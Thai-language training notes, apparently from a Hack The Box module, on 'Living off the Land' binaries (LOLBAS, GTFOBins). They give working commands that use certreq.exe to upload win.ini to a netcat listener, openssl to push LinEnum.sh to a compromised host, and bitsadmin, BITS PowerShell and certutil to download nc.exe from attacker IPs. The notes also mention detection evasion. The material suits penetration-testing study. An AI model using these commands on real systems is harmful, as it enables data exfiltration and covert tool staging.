# Living off The Land

## บทนำ

### ที่มาของคำศัพท์
- **"Living off the Land"** - คิดค้นโดย Christopher Campbell (@obscuresec) และ Matt Graeber (@mattifestation) ที่งาน DerbyCon 3
- **"LOLBins"** (Living off the Land binaries) - มาจากการสนทนาบน Twitter เกี่ยวกับการเรียกชื่อ binaries ที่ผู้โจมตีสามารถใช้ทำสิ่งที่นอกเหนือจากวัตถุประสงค์เดิม

### เว็บไซต์อ้างอิง
มี 2 เว็บไซต์หลักที่รวบรวมข้อมูล Living off the Land binaries:

1. **LOLBAS Project** - สำหรับ Windows Binaries
https://lolbas-project.github.io/
2. **GTFOBins** - สำหรับ Linux Binaries
https://gtfobins.github.io/


---

## ฟังก์ชันที่ Living off the Land Binaries สามารถทำได้

Living off the Land binaries สามารถใช้ทำหน้าที่ต่างๆ ได้แก่:

| ฟังก์ชัน | คำอธิบาย |
|---------|----------|
| **Download** | ดาวน์โหลดไฟล์ |
| **Upload** | อัปโหลดไฟล์ |
| **Command Execution** | รันคำสั่ง |
| **File Read** | อ่านไฟล์ |
| **File Write** | เขียนไฟล์ |
| **Bypasses** | หลีกเลี่ยงการตรวจจับ |

---

## การใช้งาน LOLBAS Project (Windows)

### วิธีค้นหา
- ค้นหาฟังก์ชัน **Download**: ใช้ `/download`
- ค้นหาฟังก์ชัน **Upload**: ใช้ `/upload`

---

## ตัวอย่าง: CertReq.exe

### CertReq.exe คืออะไร?
- เครื่องมือ Windows สำหรับจัดการ Certificate Requests
- สามารถใช้อัปโหลดไฟล์ได้

### ขั้นตอนการใช้งาน

#### **1. ตั้ง Netcat Listener บน Pwnbox:**
```bash
sudo nc -lvnp 8000
```

#### **2. อัปโหลดไฟล์จาก Windows Target:**
```cmd
certreq.exe -Post -config http://192.168.49.128:8000/ c:\windows\win.ini
```

**พารามิเตอร์:**
- `-Post`: ใช้ HTTP POST method
- `-config`: กำหนด URL ปลายทาง
- ตามด้วยไฟล์ที่ต้องการอัปโหลด

#### **3. รับไฟล์บน Netcat:**
```
POST / HTTP/1.1
Cache-Control: no-cache
Connection: Keep-Alive
Content-Type: application/json
Content-Length: 92

; for 16-bit app support
[fonts]
[extensions]
[mci extensions]
...
```

### ⚠️ Troubleshooting
หากเจอ Error: เวอร์ชันของ `certreq.exe` อาจไม่รองรับพารามิเตอร์ `-Post` ให้ดาวน์โหลดเวอร์ชันใหม่กว่า

---

## การใช้งาน GTFOBins (Linux)

### วิธีค้นหา
- ค้นหาฟังก์ชัน **Download**: ใช้ `+file download`
- ค้นหาฟังก์ชัน **Upload**: ใช้ `+file upload`

---

## ตัวอย่าง: OpenSSL

### OpenSSL คืออะไร?
- เครื่องมือเข้ารหัสที่ติดตั้งมาบ่อยใน Linux
- ใช้สร้าง security certificates
- สามารถใช้ส่งไฟล์แบบ "nc style" ได้

### ขั้นตอนการใช้งาน

#### **1. สร้าง Certificate บน Pwnbox:**
```bash
openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem
```

**คำอธิบายพารามิเตอร์:**
- `-newkey rsa:2048`: สร้าง RSA key ขนาด 2048 bits
- `-nodes`: ไม่เข้ารหัส private key
- `-keyout key.pem`: บันทึก private key
- `-x509`: สร้าง self-signed certificate
- `-days 365`: Certificate มีอายุ 365 วัน
- `-out certificate.pem`: บันทึก certificate

#### **2. เริ่ม Server บน Pwnbox:**
```bash
openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem < /tmp/LinEnum.sh
```

**คำอธิบายพารามิเตอร์:**
- `s_server`: โหมด server
- `-quiet`: ไม่แสดงข้อมูลมากเกินไป
- `-accept 80`: รับ connection ที่พอร์ต 80
- `-cert`: ระบุ certificate file
- `-key`: ระบุ private key file
- `< /tmp/LinEnum.sh`: ส่งไฟล์นี้เมื่อมี client เชื่อมต่อ

#### **3. ดาวน์โหลดไฟล์จาก Compromised Machine:**
```bash
openssl s_client -connect 10.10.10.32:80 -quiet > LinEnum.sh
```

**คำอธิบายพารามิเตอร์:**
- `s_client`: โหมด client
- `-connect`: เชื่อมต่อไปยัง IP:Port
- `-quiet`: ไม่แสดงข้อมูลมากเกินไป
- `> LinEnum.sh`: บันทึก output เป็นไฟล์

---

## เครื่องมือ Living off the Land อื่นๆ ที่พบบ่อย

---

## 1. Bitsadmin (Windows)

### BITS คืออะไร?
- **Background Intelligent Transfer Service**
- บริการของ Windows สำหรับดาวน์โหลดไฟล์
- ตรวจสอบการใช้งาน host และ network เพื่อลดผลกระทบต่อการทำงานของผู้ใช้

### คุณสมบัติ
- ดาวน์โหลดจาก HTTP sites และ SMB shares
- ทำงานใน background อัจฉริยะ

### ตัวอย่างการใช้งาน

#### **ดาวน์โหลดด้วย Bitsadmin:**
```cmd
bitsadmin /transfer wcb /priority foreground http://10.10.15.66:8000/nc.exe C:\Users\htb-student\Desktop\nc.exe
```

**พารามิเตอร์:**
- `/transfer`: สร้าง transfer job
- `wcb`: ชื่อ job (ตั้งเองได้)
- `/priority foreground`: กำหนดลำดับความสำคัญ
- URL source และ destination path

---

## 2. PowerShell BITS Module

### คุณสมบัติ
- รองรับการดาวน์โหลดและอัปโหลด
- รองรับ credentials
- ใช้ proxy servers ได้

### ตัวอย่างการใช้งาน

```powershell
Import-Module bitstransfer
Start-BitsTransfer -Source "http://10.10.10.32:8000/nc.exe" -Destination "C:\Windows\Temp\nc.exe"
```

**คำสั่ง:**
- `Import-Module bitstransfer`: โหลด BITS module
- `Start-BitsTransfer`: เริ่ม transfer
- `-Source`: URL ต้นทาง
- `-Destination`: ปลายทาง

---

## 3. Certutil (Windows)

### ประวัติ
- Casey Smith (@subTee) ค้นพบว่า Certutil สามารถดาวน์โหลดไฟล์ใดก็ได้
- มีอยู่ใน Windows ทุกเวอร์ชัน
- เป็นเทคนิคยอดนิยม (defacto wget สำหรับ Windows)

### ⚠️ ข้อควรระวัง
**AMSI (Antimalware Scan Interface)** ปัจจุบันตรวจจับการใช้งาน Certutil แบบนี้ว่าเป็น malicious

### ตัวอย่างการใช้งาน

```cmd
certutil.exe -verifyctl -split -f http://10.10.10.32:8000/nc.exe
```

**พารามิเตอร์:**
- `-verifyctl`: ตรวจสอบ Certificate Trust List
- `-split`: แยกไฟล์ที่ฝังอยู่
- `-f`: บังคับ overwrite

